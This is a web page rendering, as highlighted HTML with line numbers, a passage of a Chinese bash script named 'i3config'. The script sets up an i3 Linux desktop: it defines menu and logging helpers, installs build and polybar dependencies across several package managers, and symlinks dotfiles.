class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br><span class="line">925</span><br><span class="line">926</span><br><span class="line">927</span><br><span class="line">928</span><br><span class="line">929</span><br><span class="line">930</span><br><span class="line">931</span><br><span class="line">932</span><br><span class="line">933</span><br><span class="line">934</span><br><span class="line">935</span><br><span class="line">936</span><br><span class="line">937</span><br><span class="line">938</span><br><span class="line">939</span><br><span class="line">940</span><br><span class="line">941</span><br><span class="line">942</span><br><span class="line">943</span><br><span class="line">944</span><br><span class="line">945</span><br><span class="line">946</span><br><span class="line">947</span><br><span class="line">948</span><br><span class="line">949</span><br><span class="line">950</span><br><span class="line">951</span><br><span class="line">952</span><br><span class="line">953</span><br><span class="line">954</span><br><span class="line">955</span><br><span class="line">956</span><br><span class="line">957</span><br><span class="line">958</span><br><span class="line">959</span><br><span class="line">960</span><br><span class="line">961</span><br><span class="line">962</span><br><span class="line">963</span><br><span class="line">964</span><br><span class="line">965</span><br><span class="line">966</span><br><span class="line">967</span><br><span class="line">968</span><br><span class="line">969</span><br><span class="line">970</span><br><span class="line">971</span><br><span class="line">972</span><br><span class="line">973</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/usr/bin/env bash</span><br><span class="hljs-comment">########################################################################</span><br><span class="hljs-comment"># File Name: i3config</span><br><span class="hljs-comment"># Author: Awkee</span><br><span class="hljs-comment"># mail: next4nextjob@gmail.com</span><br><span class="hljs-comment"># Created Time: 2023年 06月 15日 星期四 19:28:08 CST</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># 非强制性约束: 网络下载使用curl命令而不用wget，没有任何歧视含义，仅处于统一要求</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># 功能简述:  个人Linux桌面环境配置工具</span><br><span class="hljs-comment">########################################################################</span><br><span class="hljs-comment"># set -e              # 命令执行失败就中止继续执行</span><br><span class="hljs-comment"># 环境变量参数:</span><br><span class="hljs-comment">#   OUTPUTLOG - no 表示只输出日志信息到文件中,不在终端显示，默认为 yes(终端显示)</span><br><span class="hljs-comment">#</span><br>I3CONFIG_VERSION=<span class="hljs-string">&quot;v0.1.3&quot;</span><br>dotfiles_path=<span class="hljs-variable">$HOME</span>/.config/dotfiles<br><br><span class="hljs-built_in">source</span> ~/.bashrc<br><br><span class="hljs-comment">#### 默认选项 #####</span><br>default_confirm=<span class="hljs-string">&quot;no&quot;</span>    <span class="hljs-comment"># 是否提示确认，no-提示，yes-自动选择yes</span><br>PMT=<span class="hljs-string">&quot;&gt;&gt;&gt;&quot;</span><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$OUTPUTLOG</span>&quot;</span> = <span class="hljs-string">&quot;&quot;</span> ] ; <span class="hljs-keyword">then</span><br>    OUTPUTLOG=<span class="hljs-string">&quot;yes&quot;</span>  <span class="hljs-comment"># 默认输出日志内容到 stdout</span><br><span class="hljs-keyword">fi</span><br><br><br>curl_cmd=<span class="hljs-string">&quot;curl -C - &quot;</span>  <span class="hljs-comment"># 支持断点继续下载</span><br><br><span class="hljs-comment"># Define Colors</span><br>RED=<span class="hljs-string">&#x27;\e[41m&#x27;</span><br>BRB=<span class="hljs-string">&#x27;\e[1;7;31;47m&#x27;</span> <span class="hljs-comment"># Blink Red bold</span><br>NC=<span class="hljs-string">&#x27;\e[0m&#x27;</span> <span class="hljs-comment"># No color</span><br>BG=<span class="hljs-string">&#x27;\e[7m&#x27;</span> <span class="hljs-comment"># Highlighting Background color</span><br>TC=<span class="hljs-string">&#x27;\e[1m&#x27;</span> <span class="hljs-comment"># Highlighting Text color</span><br><br><span class="hljs-comment">########### 文字显示颜色输出函数 ######</span><br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">echo_white</span></span>()  &#123; <span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;\033[0;37m<span class="hljs-variable">$@</span>\033[0m&quot;</span>     ; &#125;<br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">echo_whiter</span></span>() &#123; <span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;\033[0;37;7m<span class="hljs-variable">$@</span>\033[0m&quot;</span>   ; &#125;<br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">echo_red</span></span>()    &#123; <span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;\033[0;31m<span class="hljs-variable">$@</span>\033[0m&quot;</span>     ; &#125;<br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">echo_redr</span></span>()   &#123; <span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;\033[0;31;7m<span class="hljs-variable">$@</span>\033[0m&quot;</span>   ; &#125;<br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">echo_green</span></span>()  &#123; <span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;\033[0;32m<span class="hljs-variable">$@</span>\033[0m&quot;</span>     ; &#125;<br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">echo_greenr</span></span>() &#123; <span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;\033[0;32;7m<span class="hljs-variable">$@</span>\033[0m&quot;</span>   ; &#125;<br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">white_line</span></span>()  &#123; <span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;\033[0;37m<span class="hljs-variable">$@</span>\033[0m\n&quot;</span>   ; &#125;<br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">whiter_line</span></span>() &#123; <span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;\033[0;37;7m<span class="hljs-variable">$@</span>\033[0m\n&quot;</span> ; &#125;<br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">red_line</span></span>()    &#123; <span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;\033[0;31;1m<span class="hljs-variable">$@</span>\033[0m\n&quot;</span> ; &#125;<br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">redr_line</span></span>()   &#123; <span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;\033[0;31;7m<span class="hljs-variable">$@</span>\033[0m\n&quot;</span> ; &#125;<br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">green_line</span></span>()  &#123; <span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;\033[0;32;1m<span class="hljs-variable">$@</span>\033[0m\n&quot;</span> ; &#125;<br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">greenr_line</span></span>() &#123; <span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;\033[0;32;7m<span class="hljs-variable">$@</span>\033[0m\n&quot;</span> ; &#125;<br><br>line_feed=<span class="hljs-string">&quot;+--------------------------------------------------------------------------------+&quot;</span><br><br><span class="hljs-comment"># 临时存储代码、下载文件目录</span><br>tmp_dir=/tmp<br>item_index=0   <span class="hljs-comment"># 记录菜单选项序号</span><br>item_line_count=2   <span class="hljs-comment"># 每行显示菜单数量</span><br>ILEN=40   <span class="hljs-comment"># 单个选项长度</span><br>MLEN=$((<span class="hljs-variable">$&#123;ILEN&#125;</span> * <span class="hljs-variable">$&#123;item_line_count&#125;</span>))   <span class="hljs-comment"># 单行最大长度</span><br><br><br><span class="hljs-comment">#### 检测当前终端支持色彩</span><br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">check_term</span></span>() &#123;<br><span class="hljs-comment"># 指定 TERM ，避免对齐问题(已知某些rxvt-unicode终端版本存在对齐问题)</span><br>    <span class="hljs-keyword">if</span> [[ <span class="hljs-string">&quot;`tput colors`&quot;</span> -ge <span class="hljs-string">&quot;256&quot;</span> ]] ; <span class="hljs-keyword">then</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;支持 256color TERM终端&quot;</span><br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">export</span> TERM=xterm<br>        <span class="hljs-built_in">export</span> COLORTERM=truecolor<br>    <span class="hljs-keyword">fi</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;当前终端类型: <span class="hljs-variable">$TERM</span>&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;当前终端色彩: <span class="hljs-variable">$COLORTERM</span>&quot;</span><br><span class="hljs-comment">#echo &quot;提示: 8bit 仅支持8种色彩, truecolor/24bit 支持更多色彩&quot;</span><br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">menu_line</span></span>() &#123; <span class="hljs-built_in">let</span> rlen=<span class="hljs-string">&quot;<span class="hljs-variable">$item_line_count</span> * <span class="hljs-variable">$ILEN</span> + 1&quot;</span> ; <span class="hljs-built_in">echo</span> -en <span class="hljs-string">&quot;|<span class="hljs-variable">$&#123;BRB&#125;</span> <span class="hljs-variable">$@</span> <span class="hljs-variable">$NC</span>&quot;</span> ; tput hpa <span class="hljs-variable">$rlen</span> ; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;|&quot;</span> ; &#125;<br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">menu_head</span></span>() &#123; <span class="hljs-built_in">echo</span> <span class="hljs-variable">$line_feed</span> ;   menu_line <span class="hljs-string">&quot;<span class="hljs-variable">$@</span>&quot;</span> ; <span class="hljs-built_in">echo</span> <span class="hljs-variable">$line_feed</span> ; &#125;<br><span class="hljs-comment"># 一行可以有 item_line_count 个菜单选项</span><br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">menu_item</span></span>() &#123; <span class="hljs-built_in">let</span> item_index=<span class="hljs-variable">$item_index</span>+1 ; n=<span class="hljs-variable">$1</span> ; <span class="hljs-built_in">shift</span> ; <span class="hljs-built_in">let</span> rlen=<span class="hljs-string">&quot;<span class="hljs-variable">$item_index</span> * <span class="hljs-variable">$ILEN</span> + 1&quot;</span> ; <span class="hljs-built_in">echo</span> -en <span class="hljs-string">&quot;|  <span class="hljs-variable">$BG</span> <span class="hljs-variable">$&#123;n&#125;</span> <span class="hljs-variable">$NC</span> <span class="hljs-variable">$@</span>&quot;</span> ; tput hpa <span class="hljs-variable">$rlen</span> ; [[ <span class="hljs-string">&quot;<span class="hljs-variable">$item_index</span>&quot;</span> == <span class="hljs-string">&quot;<span class="hljs-variable">$item_line_count</span>&quot;</span> ]] &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;|&quot;</span> &amp;&amp; item_index=0 ; &#125;<br><span class="hljs-comment"># 输出单行长菜单选项,长度有限制</span><br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">menu_iteml</span></span>() &#123; <span class="hljs-built_in">let</span> rlen=<span class="hljs-string">&quot;<span class="hljs-variable">$item_line_count</span> * <span class="hljs-variable">$ILEN</span> + 1&quot;</span> ; n=<span class="hljs-variable">$1</span> ; <span class="hljs-built_in">shift</span> ; <span class="hljs-built_in">echo</span> -en <span class="hljs-string">&quot;|  <span class="hljs-variable">$BG</span> <span class="hljs-variable">$&#123;n&#125;</span> <span class="hljs-variable">$NC</span> <span class="hljs-variable">$@</span>&quot;</span> ; tput hpa <span class="hljs-variable">$rlen</span> ; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;|&quot;</span> ; &#125;<br><span class="hljs-comment"># 用于输入长信息(非菜单选项),不限制结尾长度</span><br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">menu_info</span></span>() &#123; n=<span class="hljs-variable">$1</span> ; <span class="hljs-built_in">shift</span> ; <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;|  <span class="hljs-variable">$BG</span> <span class="hljs-variable">$&#123;n&#125;</span> <span class="hljs-variable">$NC</span> <span class="hljs-variable">$@</span>&quot;</span> ; &#125;<br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">menu_tail</span></span>() &#123; [[ <span class="hljs-string">&quot;<span class="hljs-variable">$item_index</span>&quot;</span> != <span class="hljs-string">&quot;0&quot;</span> ]] &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;|&quot;</span> ; <span class="hljs-built_in">echo</span> <span class="hljs-variable">$line_feed</span> ; item_index=0 ; &#125;<br><br><span class="hljs-comment"># 日志记录</span><br>log_file=<span class="hljs-string">&quot;/tmp/i3config.log&quot;</span><br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">output_msg</span></span>() &#123; LEVEL=<span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> ; <span class="hljs-built_in">shift</span> ; <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;<span class="hljs-subst">$(date +&#x27;%Y年%m月%d日%H:%M:%S&#x27;)</span>:<span class="hljs-variable">$&#123;LEVEL&#125;</span>: <span class="hljs-variable">$@</span>&quot;</span> ; &#125;<br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">output_log</span></span>() &#123; <span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$OUTPUTLOG</span>&quot;</span> = <span class="hljs-string">&quot;yes&quot;</span> ] ; <span class="hljs-keyword">then</span>  output_msg <span class="hljs-variable">$@</span> | <span class="hljs-built_in">tee</span> -a <span class="hljs-variable">$log_file</span> ; <span class="hljs-keyword">else</span> output_msg <span class="hljs-variable">$@</span> &gt;&gt; <span class="hljs-variable">$log_file</span> ; <span class="hljs-keyword">fi</span> &#125;<br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">loginfo</span></span>() &#123; output_log <span class="hljs-string">&quot;INFO&quot;</span> <span class="hljs-variable">$@</span>  ; &#125;<br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">logerr</span></span>()  &#123; output_log <span class="hljs-string">&quot;ERROR&quot;</span> <span class="hljs-variable">$@</span> ; &#125;<br><br><span class="hljs-comment">################################################################</span><br><span class="hljs-comment">#  文本信息设定</span><br><br><span class="hljs-comment"># 欢迎和再见提示信息</span><br>WELCOME=<span class="hljs-string">&quot;^_^你笑起来真好看!像春天的花一样!&quot;</span><br>SEE_YOU=<span class="hljs-string">&quot;^_^出去晒晒太阳吧!多运动才更健康!&quot;</span><br><br>READ_TIMEOUT=30   <span class="hljs-comment"># read timeout seconds</span><br><br><span class="hljs-comment">########### 运行条件检测 ###########</span><br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">prompt</span></span>() &#123; <span class="hljs-comment"># 提示确认函数，如果使用 -y 参数默认为Y确认</span><br>    msg=<span class="hljs-string">&quot;<span class="hljs-variable">$@</span>&quot;</span><br>    <span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$default_confirm</span>&quot;</span> != <span class="hljs-string">&quot;yes&quot;</span> ] ; <span class="hljs-keyword">then</span><br>        <span class="hljs-built_in">read</span> -t <span class="hljs-variable">$READ_TIMEOUT</span> -r -n 1 -e  -p <span class="hljs-string">&quot;<span class="hljs-variable">$msg</span> (y/`echo_greenr N`)&quot;</span> str_answer<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;<span class="hljs-variable">$str_answer</span>&quot;</span> <span class="hljs-keyword">in</span><br>            y*|Y*)  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;已确认&quot;</span> ; <span class="hljs-built_in">return</span> 0 ;;<br>            *)      <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;已取消&quot;</span> ; <span class="hljs-built_in">return</span> 1 ;;<br>        <span class="hljs-keyword">esac</span><br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$msg</span> (已默认选择 Yes)&quot;</span><br>    <span class="hljs-keyword">fi</span><br>    <span class="hljs-built_in">return</span> 0<br>&#125;<br><span class="hljs-comment"># 检查是否有root权限并提示，需要root权限的命令要添加sudo</span><br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">check_root</span></span>() &#123; [[ <span class="hljs-string">&quot;`uid -u`&quot;</span> = <span class="hljs-string">&quot;0&quot;</span> ]]  &amp;&amp; ! prompt <span class="hljs-string">&quot;提示:确认在root用户下或者使用sudo运行?&quot;</span> &amp;&amp; <span class="hljs-built_in">exit</span> 0 ; &#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">check_basic</span></span>() &#123; <span class="hljs-comment"># 基础依赖命令检测与安装</span><br>    <span class="hljs-built_in">command</span> -v apt-get &gt;/dev/null 2&gt;&amp;1 &amp;&amp; sudo apt-get install   -y curl git<br>    <span class="hljs-built_in">command</span> -v dnf     &gt;/dev/null 2&gt;&amp;1 &amp;&amp; sudo dnf install       -y curl git<br>    <span class="hljs-built_in">command</span> -v zypper  &gt;/dev/null 2&gt;&amp;1 &amp;&amp; sudo zypper install    -y curl git<br>    <span class="hljs-built_in">command</span> -v pacman  &amp;&amp; sudo pacman -S --noconfirm --needed curl git<br><br>    <span class="hljs-comment"># Anaconda3 环境可能导致编译失败.</span><br>    <span class="hljs-comment"># 如果不是使用 conda init 方式设置环境，可能取消激活操作会失败</span><br>    anaconda -V &gt;/dev/null 2&gt;&amp;1 &amp;&amp; <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;python3 version: <span class="hljs-variable">$&#123;BRB&#125;</span>`python3 --version` <span class="hljs-variable">$&#123;NC&#125;</span>,path: <span class="hljs-variable">$&#123;BRB&#125;</span>`command -v python3`<span class="hljs-variable">$&#123;NC&#125;</span>&quot;</span> &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;检测到您使用了 anaconda 环境，这可能导致编译安装失败, 本脚本会关闭Anaconda环境&quot;</span> &amp;&amp; conda deactivate<br>    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;python3 version: <span class="hljs-variable">$&#123;BRB&#125;</span>`python3 --version`<span class="hljs-variable">$&#123;NC&#125;</span> ,path: <span class="hljs-variable">$&#123;BRB&#125;</span>`command -v python3`<span class="hljs-variable">$&#123;NC&#125;</span>&quot;</span><br>&#125;<br><br><span class="hljs-comment"># 创建软链接或重命名目录</span><br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">create_symlink</span></span>() &#123;<br>    source_file=<span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span><br>    target_file=<span class="hljs-string">&quot;<span class="hljs-variable">$2</span>&quot;</span><br><br>    [[ ! -r <span class="hljs-string">&quot;<span class="hljs-variable">$source_file</span>&quot;</span> ]] &amp;&amp; loginfo <span class="hljs-string">&quot;找不到 <span class="hljs-variable">$source_file</span> 目录或文件&quot;</span> &amp;&amp; <span class="hljs-built_in">return</span> 1<br>    [[ -L <span class="hljs-string">&quot;<span class="hljs-variable">$target_file</span>&quot;</span> ]] &amp;&amp; loginfo <span class="hljs-string">&quot;目标路径 <span class="hljs-variable">$&#123;target_file&#125;</span> 是软链接，删除软链接&quot;</span> &amp;&amp; <span class="hljs-built_in">rm</span> <span class="hljs-string">&quot;<span class="hljs-variable">$target_file</span>&quot;</span><br>    [[ -r <span class="hljs-string">&quot;<span class="hljs-variable">$target_file</span>&quot;</span> ]] &amp;&amp; loginfo <span class="hljs-string">&quot;目标路径 <span class="hljs-variable">$&#123;target_file&#125;</span> 是目录或文件，重命名&quot;</span> &amp;&amp; <span class="hljs-built_in">mv</span> <span class="hljs-variable">$&#123;target_file&#125;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;target_file&#125;</span>_<span class="hljs-subst">$(date +%Y-%m-%d)</span>&quot;</span><br>    <span class="hljs-comment"># 创建软链接</span><br>    <span class="hljs-built_in">ln</span> -sf <span class="hljs-string">&quot;<span class="hljs-variable">$source_file</span>&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$target_file</span>&quot;</span><br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">install_build_deps</span></span>() &#123;<br>    <span class="hljs-built_in">command</span> -v apt-get &amp;&amp; sudo apt-get install   -y build-essential git meson ninja-build make cmake cmake-data pkg-config python3-sphinx python3-packaging dh-autoreconf &amp;&amp; <span class="hljs-built_in">return</span> 0<br>    <span class="hljs-built_in">command</span> -v dnf     &amp;&amp; sudo dnf install       -y gcc gcc-c++ git meson ninja-build pkg-config make cmake @development-tools python3-sphinx python3-sphinx_rtd_theme python3-packaging dh-autoreconf &amp;&amp; <span class="hljs-built_in">return</span> 0<br>    <span class="hljs-built_in">command</span> -v zypper  &amp;&amp; sudo zypper install    -y gcc gcc-c++ git meson ninja pkg-config make cmake python3 python3-Sphinx python3-packaging python3-sphinx_rtd_theme dh-autoreconf &amp;&amp; <span class="hljs-built_in">return</span> 0<br>    <span class="hljs-built_in">command</span> -v pacman  &amp;&amp; sudo pacman -S --needed --noconfirm --needed gcc git meson ninja pkg-config make cmake python3 python-sphinx python-packaging python-sphinx_rtd_theme autoconf automake bison &amp;&amp; <span class="hljs-built_in">return</span> 0<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">install_polybar_deps</span></span>() &#123;<br>    <span class="hljs-built_in">command</span> -v apt-get   &amp;&amp; sudo apt-get install -y libuv1-dev libcairo2-dev libxcb1-dev libxcb-util0-dev libxcb-randr0-dev libxcb-composite0-dev python3-xcbgen xcb-proto libxcb-image0-dev libxcb-ewmh-dev libxcb-icccm4-dev lm-sensors x11-utils xdotool pulseaudio pulseaudio-utils &amp;&amp; <span class="hljs-built_in">return</span> 0<br>    <span class="hljs-built_in">command</span> -v dnf       &amp;&amp; sudo dnf install     -y libuv-devel cairo-devel xcb-util-devel libxcb-devel xcb-proto xcb-util-image-devel xcb-util-wm-devel lm_sensors xprop xdotool xev xwininfo pulseaudio pulseaudio-utils &amp;&amp; <span class="hljs-built_in">return</span> 0<br>    <span 